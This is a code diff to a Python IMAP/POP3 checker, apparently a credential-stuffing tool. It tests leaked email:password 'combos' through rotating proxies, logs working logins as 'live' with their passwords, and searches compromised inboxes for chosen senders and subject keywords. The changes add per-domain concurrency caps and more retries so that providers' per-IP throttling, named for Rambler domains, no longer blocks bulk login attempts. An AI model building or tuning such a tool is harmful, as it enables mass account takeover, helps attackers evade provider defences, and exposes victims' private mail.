@@ -157,6 +157,10 @@ class FastImapEngine:
         self._runtime_resolved_domains: Dict[str, Any] = {}
         self._unreg_domains_set: Set[str] = set()
 
+        # Per-domain concurrency limiters (guards against per-IP throttling)
+        self._domain_limiters: Dict[str, Any] = {}
+        self.domain_max_concurrency = int(getattr(self, "domain_max_concurrency", 60) or 60)
+
         # Write queue for zero-contention asynchronous flushing
         self.write_queue = asyncio.Queue()
         self.stop_event = asyncio.Event()
@@ -167,6 +171,30 @@ class FastImapEngine:
         p = self.proxies[self._proxy_idx % len(self.proxies)]
         self._proxy_idx += 1
         return p
+
+    def _get_domain_limiter(self, domain: str):
+        """Per-domain concurrency cap, shared across the whole run.
+
+        Some providers (Rambler and its family: rambler.ru, myrambler.ru,
+        ro.ru, lenta.ru, autorambler.ru) throttle parallel SSL handshakes per
+        source IP. They do not refuse the connection, they just never send the
+        banner, so a burst run collects plain TimeoutError for a large slice of
+        accounts. Capping per-domain parallelism keeps that below the throttle
+        threshold without slowing unrelated domains.
+        """
+        lim = self._domain_limiters.get(domain)
+        if lim is None:
+            limit = self._domain_concurrency()
+            if limit <= 0:
+                lim = None
+            else:
+                lim = asyncio.Semaphore(limit)
+            self._domain_limiters[domain] = lim
+        return lim
+
+    def _domain_concurrency(self) -> int:
+        limit = int(getattr(self, "domain_max_concurrency", 0) or 0)
+        return limit
 
     def _effective_concurrency(self) -> int:
         """Clamp concurrency to what the process fd budget can actually serve.
@@ -393,7 +421,8 @@ class FastImapEngine:
         is_live = False
         try:
             connected = False
-            for attempt in range(2):
+            retries = 4
+            for attempt in range(retries):
                 try:
                     reader, writer = await self._connect_imap(server, port, use_ssl, proxy)
                     banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
@@ -416,8 +445,8 @@ class FastImapEngine:
                         except Exception:
                             pass
                         writer = None
-                    if attempt == 0:
-                        await asyncio.sleep(0.4)
+                    if attempt < retries - 1:
+                        await asyncio.sleep(0.4 * (attempt + 1))
                 except Exception:
                     if writer:
                         try:
@@ -426,8 +455,8 @@ class FastImapEngine:
                         except Exception:
                             pass
                         writer = None
-                    if attempt == 0:
-                        await asyncio.sleep(0.4)
+                    if attempt < retries - 1:
+                        await asyncio.sleep(0.4 * (attempt + 1))
 
             if not connected:
                 raise ConnectionError("Failed to connect POP3 server")
@@ -692,277 +721,301 @@ class FastImapEngine:
             protocol = str(cfg.get("protocol", "imap")).lower()
             proxy = self._get_proxy()
 
+            # Per-domain cap: throttling providers answer slow (not refused) when
+            # hit with too many parallel handshakes from one IP, which otherwise
+            # turns into TimeoutError -> false die.
+            limiter = self._get_domain_limiter(domain)
+
             # Protocol POP3 direct route
             if protocol == "pop3" or port in (995, 110):
-                await self._check_single_account_pop3(server, port, use_ssl, proxy, email_addr, password, combo)
+                if limiter is not None:
+                    async with limiter:
+                        await self._check_single_account_pop3(
+                            server, port, use_ssl, proxy, email_addr, password, combo)
+                else:
+                    await self._check_single_account_pop3(
+                        server, port, use_ssl, proxy, email_addr, password, combo)
                 return
 
-            reader = None
-            writer = None
-            banner = None
-            connected = False
-            for attempt in range(2):
-                try:
-                    reader, writer = await self._connect_imap(server, port, use_ssl, proxy)
-                    banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
-                    if banner and banner.strip().startswith(b"+OK"):
-                        # Server is actually POP3
-                        try:
-                            writer.close()
-                            await writer.wait_closed()
-                        except Exception:
-                            pass
-                        await self._check_single_account_pop3(server, port, use_ssl, proxy, email_addr, password, combo)
-                        return
-                    if not banner or not (b"* OK" in banner.upper() or b"IMAP" in banner.upper()):
-                        raise ConnectionError("Invalid greeting banner")
-                    connected = True
-                    break
-                except OSError as exc:
-                    if getattr(exc, "errno", None) in (24, 23):
-                        # EMFILE/ENFILE — our own fd exhaustion, not the server.
-                        # Skipping keeps the account out of die.txt so it can be
-                        # picked up by the next run instead of being lost.
-                        self.skipped_count += 1
-                        self.checked += 1
-                        await self.write_queue.put(("skip", combo))
-                        if self.on_progress:
-                            self.on_progress("skip")
-                        return
-                    if writer:
-                        try:
-                            writer.close()
-                            await writer.wait_closed()
-                        except Exception:
-                            pass
-                        writer = None
-                    if attempt == 0:
-                        await asyncio.sleep(0.4)
-                except Exception:
-                    if writer:
-                        try:
-                            writer.close()
-                            await writer.wait_closed()
-                        except Exception:
-                            pass
-                        writer = None
-                    if attempt == 0:
-                        await asyncio.sleep(0.4)
-
-            if not connected:
-                # Dual-port fallback (993 SSL <-> 143 Plain)
-                alt_port = 143 if port == 993 else 993
-                alt_ssl = (alt_port == 993)
-                try:
-                    reader, writer = await self._connect_imap(server, alt_port, alt_ssl, proxy)
-                    banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
-                    if banner and (b"* OK" in banner.upper() or b"IMAP" in banner.upper()):
-                        port = alt_port
-                        use_ssl = alt_ssl
-                    else:
-                        raise ConnectionError("Invalid fallback greeting")
-                except OSError as exc:
-                    # EMFILE/ENFILE: our own fd table, not the account. Never
-                    # classify as die — a live account would be lost forever.
-                    if getattr(exc, "errno", None) not in (24, 23):
-                        self.die_count += 1
-                        self.checked += 1
-                        await self.write_queue.put(("die", combo))
-                        if self.on_progress:
-                            self.on_progress("die")
-                    else:
-                        self.skipped_count += 1
-                        self.checked += 1
-                        await self.write_queue.put(("skip", combo))
-                        if self.on_progress:
-                            self.on_progress("skip")
-                    return
-                except Exception:
-                    self.die_count += 1
-                    self.checked += 1
-                    await self.write_queue.put(("die", combo))
-                    if self.on_progress:
-                        self.on_progress("die")
-                    return
-            is_live = False
+            if limiter is not None:
+                await limiter.acquire()
             try:
-                # STARTTLS upgrade if plain connection and required/supported
-                if not use_ssl and b"STARTTLS" in banner.upper() and b"LOGINDISABLED" in banner.upper():
-                    writer.write(b"A0 STARTTLS\r\n")
-                    await writer.drain()
-                    st_resp = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
-                    if st_resp.upper().startswith(b"A0 OK"):
-                        loop = asyncio.get_running_loop()
-                        protocol = writer.transport.get_protocol()
-                        new_trans = await loop.start_tls(writer.transport, protocol, _GLOBAL_SSL_CTX, server_hostname=server)
-                        setattr(writer, "_transport", new_trans)
-
-                # Send LOGIN
-                cmd = b"A1 LOGIN " + _escape_imap_str(email_addr) + b" " + _escape_imap_str(password) + b"\r\n"
-                writer.write(cmd)
-                await writer.drain()
-
-                # Read response until tagged line
-                is_live = False
-                while True:
-                    line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
-                    if not line:
-                        break
-                    u = line.upper()
-                    if u.startswith(b"A1 OK"):
-                        is_live = True
-                        break
-                    elif u.startswith(b"A1 NO") or u.startswith(b"A1 BAD"):
-                        is_live = False
-                        break
-
-                if not is_live:
-                    self.die_count += 1
-                    self.checked += 1
-                    await self.write_queue.put(("die", combo))
-                    if self.on_progress:
-                        self.on_progress("die")
-                    writer.write(b"A9 LOGOUT\r\n")
-                    await writer.drain()
-                    return
-
-                # LIVE account!
-                # If pure empass mode (no criteria or explicit "*")
-                is_pure_empass = (self.target_senders == ["*"]) or (not self.target_senders and not self.keywords)
-                if is_pure_empass:
-                    self.live_count += 1
-                    self.checked += 1
-                    await self.write_queue.put(("live", f"[+] Account: {email_addr}:{password}"))
-                    if self.on_live:
-                        self.on_live({"account": email_addr, "password": password, "email_count": 0, "emails": []})
-                    if self.on_progress:
-                        self.on_progress("live")
-                    writer.write(b"A9 LOGOUT\r\n")
-                    await writer.drain()
-                    return
-
-                # Search requested: SELECT INBOX
-                writer.write(b"A2 SELECT INBOX\r\n")
-                await writer.drain()
-                inbox_ok = False
-                while True:
-                    line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
-                    if not line:
-                        break
-                    if line.upper().startswith(b"A2 OK"):
-                        inbox_ok = True
-                        break
-                    elif line.upper().startswith(b"A2 NO") or line.upper().startswith(b"A2 BAD"):
-                        break
-
-                if not inbox_ok:
-                    self.noemail_count += 1
-                    self.checked += 1
-                    await self.write_queue.put(("noemail", combo))
-                    if self.on_progress:
-                        self.on_progress("noemail")
-                    writer.write(b"A9 LOGOUT\r\n")
-                    await writer.drain()
-                    return
-
-                # Search by sender / keyword
-                matching_ids = set()
-                tag_idx = 3
-
-                # Search target senders
-                for sender in self.target_senders:
-                    if sender == "*":
-                        continue
-                    tag = f"A{tag_idx}".encode()
-                    tag_idx += 1
-                    clean_s = sender.lstrip("@") if sender.startswith("@") else sender
-                    crit = f'{tag.decode()} SEARCH SINCE {self.search_since} FROM "{clean_s}"\r\n'
-                    writer.write(crit.encode())
-                    await writer.drain()
-                    while True:
-                        line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
-                        if not line:
-                            break
-                        if line.startswith(b"* SEARCH"):
-                            parts = line.split()[2:]
-                            matching_ids.update(parts)
-                        if line.startswith(tag):
-                            break
-
-                # Search keywords
-                for kw in self.keywords:
-                    tag = f"A{tag_idx}".encode()
-                    tag_idx += 1
-                    crit = f'{tag.decode()} SEARCH SINCE {self.search_since} SUBJECT "{kw}"\r\n'
-                    writer.write(crit.encode())
-                    await writer.drain()
-                    while True:
-                        line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
-                        if not line:
-                            break
-                        if line.startswith(b"* SEARCH"):
-                            parts = line.split()[2:]
-                            matching_ids.update(parts)
-                        if line.startswith(tag):
-                            break
-
-                emails_data = []
-                if matching_ids:
-                    # Fetch details for up to 20 newest matching IDs
-                    valid_ids = [x.decode() if isinstance(x, bytes) else str(x) for x in matching_ids]
-                    sorted_ids = sorted([x for x in valid_ids if x.isdigit()], key=int)[-20:]
-                    sorted_ids.reverse()
-
-                    raw_emails = await self._fetch_headers_for_ids(reader, writer, sorted_ids)
-                    emails_data = [
-                        em for em in raw_emails
-                        if not _subject_excluded(em.get("subject", ""), self.subject_exclusion_patterns)
-                    ]
-
-                if emails_data:
-                    self.live_count += 1
-                    self.checked += 1
-                    report_entry = format_live_report_entry(email_addr, password, emails_data, self.search_since)
-                    await self.write_queue.put(("live", report_entry))
-                    if self.on_live:
-                        self.on_live({
-                            "account": email_addr,
-                            "password": password,
-                            "email_count": len(emails_data),
-                            "emails": emails_data
-                        })
-                    if self.on_progress:
-                        self.on_progress("live")
-                else:
-                    self.noemail_count += 1
-                    self.checked += 1
-                    await self.write_queue.put(("noemail", combo))
-                    if self.on_progress:
-                        self.on_progress("noemail")
-
-                writer.write(b"A9 LOGOUT\r\n")
-                await writer.drain()
-
-            except Exception:
-                if is_live:
-                    self.noemail_count += 1
-                    self.checked += 1
-                    await self.write_queue.put(("noemail", combo))
-                    if self.on_progress:
-                        self.on_progress("noemail")
-                else:
-                    self.die_count += 1
-                    self.checked += 1
-                    await self.write_queue.put(("die", combo))
-                    if self.on_progress:
-                        self.on_progress("die")
+                await self._check_imap_locked(
+                    server, port, use_ssl, proxy, email_addr, password, combo, domain)
             finally:
+                if limiter is not None:
+                    limiter.release()
+
+    async def _check_imap_locked(self, server, port, use_ssl, proxy,
+                                 email_addr, password, combo, domain):
+        """IMAP check body; runs while holding the per-domain limiter."""
+        reader = None
+        writer = None
+        banner = None
+        connected = False
+        retries = 4
+        for attempt in range(retries):
+            try:
+                reader, writer = await self._connect_imap(server, port, use_ssl, proxy)
+                banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+                if banner and banner.strip().startswith(b"+OK"):
+                    # Server is actually POP3
+                    try:
+                        writer.close()
+                        await writer.wait_closed()
+                    except Exception:
+                        pass
+                    await self._check_single_account_pop3(server, port, use_ssl, proxy, email_addr, password, combo)
+                    return
+                if not banner or not (b"* OK" in banner.upper() or b"IMAP" in banner.upper()):
+                    raise ConnectionError("Invalid greeting banner")
+                connected = True
+                break
+            except OSError as exc:
+                if getattr(exc, "errno", None) in (24, 23):
+                    # EMFILE/ENFILE — our own fd exhaustion, not the server.
+                    # Skipping keeps the account out of die.txt so it can be
+                    # picked up by the next run instead of being lost.
+                    self.skipped_count += 1
+                    self.checked += 1
+                    await self.write_queue.put(("skip", combo))
+                    if self.on_progress:
+                        self.on_progress("skip")
+                    return
                 if writer:
                     try:
                         writer.close()
                         await writer.wait_closed()
                     except Exception:
                         pass
+                    writer = None
+                if attempt < retries - 1:
+                    await asyncio.sleep(0.4 * (attempt + 1))
+            except Exception:
+                if writer:
+                    try:
+                        writer.close()
+                        await writer.wait_closed()
+                    except Exception:
+                        pass
+                    writer = None
+                if attempt < retries - 1:
+                    await asyncio.sleep(0.4 * (attempt + 1))
+
+        if not connected:
+            # Dual-port fallback (993 SSL <-> 143 Plain)
+            alt_port = 143 if port == 993 else 993
+            alt_ssl = (alt_port == 993)
+            try:
+                reader, writer = await self._connect_imap(server, alt_port, alt_ssl, proxy)
+                banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+                if banner and (b"* OK" in banner.upper() or b"IMAP" in banner.upper()):
+                    port = alt_port
+                    use_ssl = alt_ssl
+                else:
+                    raise ConnectionError("Invalid fallback greeting")
+            except OSError as exc:
+                # EMFILE/ENFILE: our own fd table, not the account. Never
+                # classify as die — a live account would be lost forever.
+                if getattr(exc, "errno", None) not in (24, 23):
+                    self.die_count += 1
+                    self.checked += 1
+                    await self.write_queue.put(("die", combo))
+                    if self.on_progress:
+                        self.on_progress("die")
+                else:
+                    self.skipped_count += 1
+                    self.checked += 1
+                    await self.write_queue.put(("skip", combo))
+                    if self.on_progress:
+                        self.on_progress("skip")
+                return
+            except Exception:
+                self.die_count += 1
+                self.checked += 1
+                await self.write_queue.put(("die", combo))
+                if self.on_progress:
+                    self.on_progress("die")
+                return
+        is_live = False
+        try:
+            # STARTTLS upgrade if plain connection and required/supported
+            if not use_ssl and b"STARTTLS" in banner.upper() and b"LOGINDISABLED" in banner.upper():
+                writer.write(b"A0 STARTTLS\r\n")
+                await writer.drain()
+                st_resp = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+                if st_resp.upper().startswith(b"A0 OK"):
+                    loop = asyncio.get_running_loop()
+                    protocol = writer.transport.get_protocol()
+                    new_trans = await loop.start_tls(writer.transport, protocol, _GLOBAL_SSL_CTX, server_hostname=server)
+                    setattr(writer, "_transport", new_trans)
+
+            # Send LOGIN
+            cmd = b"A1 LOGIN " + _escape_imap_str(email_addr) + b" " + _escape_imap_str(password) + b"\r\n"
+            writer.write(cmd)
+            await writer.drain()
+
+            # Read response until tagged line
+            is_live = False
+            while True:
+                line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+                if not line:
+                    break
+                u = line.upper()
+                if u.startswith(b"A1 OK"):
+                    is_live = True
+                    break
+                elif u.startswith(b"A1 NO") or u.startswith(b"A1 BAD"):
+                    is_live = False
+                    break
+
+            if not is_live:
+                self.die_count += 1
+                self.checked += 1
+                await self.write_queue.put(("die", combo))
+                if self.on_progress:
+                    self.on_progress("die")
+                writer.write(b"A9 LOGOUT\r\n")
+                await writer.drain()
+                return
+
+            # LIVE account!
+            # If pure empass mode (no criteria or explicit "*")
+            is_pure_empass = (self.target_senders == ["*"]) or (not self.target_senders and not self.keywords)
+            if is_pure_empass:
+                self.live_count += 1
+                self.checked += 1
+                await self.write_queue.put(("live", f"[+] Account: {email_addr}:{password}"))
+                if self.on_live:
+                    self.on_live({"account": email_addr, "password": password, "email_count": 0, "emails": []})
+                if self.on_progress:
+                    self.on_progress("live")
+                writer.write(b"A9 LOGOUT\r\n")
+                await writer.drain()
+                return
+
+            # Search requested: SELECT INBOX
+            writer.write(b"A2 SELECT INBOX\r\n")
+            await writer.drain()
+            inbox_ok = False
+            while True:
+                line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+                if not line:
+                    break
+                if line.upper().startswith(b"A2 OK"):
+                    inbox_ok = True
+                    break
+                elif line.upper().startswith(b"A2 NO") or line.upper().startswith(b"A2 BAD"):
+                    break
+
+            if not inbox_ok:
+                self.noemail_count += 1
+                self.checked += 1
+                await self.write_queue.put(("noemail", combo))
+                if self.on_progress:
+                    self.on_progress("noemail")
+                writer.write(b"A9 LOGOUT\r\n")
+                await writer.drain()
+                return
+
+            # Search by sender / keyword
+            matching_ids = set()
+            tag_idx = 3
+
+            # Search target senders
+            for sender in self.target_senders:
+                if sender == "*":
+                    continue
+                tag = f"A{tag_idx}".encode()
+                tag_idx += 1
+                clean_s = sender.lstrip("@") if sender.startswith("@") else sender
+                crit = f'{tag.decode()} SEARCH SINCE {self.search_since} FROM "{clean_s}"\r\n'
+                writer.write(crit.encode())
+                await writer.drain()
+                while True:
+                    line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+                    if not line:
+                        break
+                    if line.startswith(b"* SEARCH"):
+                        parts = line.split()[2:]
+                        matching_ids.update(parts)
+                    if line.startswith(tag):
+                        break
+
+            # Search keywords
+            for kw in self.keywords:
+                tag = f"A{tag_idx}".encode()
+                tag_idx += 1
+                crit = f'{tag.decode()} SEARCH SINCE {self.search_since} SUBJECT "{kw}"\r\n'
+                writer.write(crit.encode())
+                await writer.drain()
+                while True:
+                    line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+                    if not line:
+                        break
+                    if line.startswith(b"* SEARCH"):
+                        parts = line.split()[2:]
+                        matching_ids.update(parts)
+                    if line.startswith(tag):
+                        break
+
+            emails_data = []
+            if matching_ids:
+                # Fetch details for up to 20 newest matching IDs
+                valid_ids = [x.decode() if isinstance(x, bytes) else str(x) for x in matching_ids]
+                sorted_ids = sorted([x for x in valid_ids if x.isdigit()], key=int)[-20:]
+                sorted_ids.reverse()
+
+                raw_emails = await self._fetch_headers_for_ids(reader, writer, sorted_ids)
+                emails_data = [
+                    em for em in raw_emails
+                    if not _subject_excluded(em.get("subject", ""), self.subject_exclusion_patterns)
+                ]
+
+            if emails_data:
+                self.live_count += 1
+                self.checked += 1
+                report_entry = format_live_report_entry(email_addr, password, emails_data, self.search_since)
+                await self.write_queue.put(("live", report_entry))
+                if self.on_live:
+                    self.on_live({
+                        "account": email_addr,
+                        "password": password,
+                        "email_count": len(emails_data),
+                        "emails": emails_data
+                    })
+                if self.on_progress:
+                    self.on_progress("live")
+            else:
+                self.noemail_count += 1
+                self.checked += 1
+                await self.write_queue.put(("noemail", combo))
+                if self.on_progress:
+                    self.on_progress("noemail")
+
+            writer.write(b"A9 LOGOUT\r\n")
+            await writer.drain()
+
+        except Exception:
+            if is_live:
+                self.noemail_count += 1
+                self.checked += 1
+                await self.write_queue.put(("noemail", combo))
+                if self.on_progress:
+                    self.on_progress("noemail")
+            else:
+                self.die_count += 1
+                self.checked += 1
+                await self.write_queue.put(("die", combo))
+                if self.on_progress:
+                    self.on_progress("die")
+        finally:
+            if writer:
+                try:
+                    writer.close()
+                    await writer.wait_closed()
+                except Exception:
+                    pass
 
     async def _writer_worker(self):
         """Batch file writer consuming from async queue.
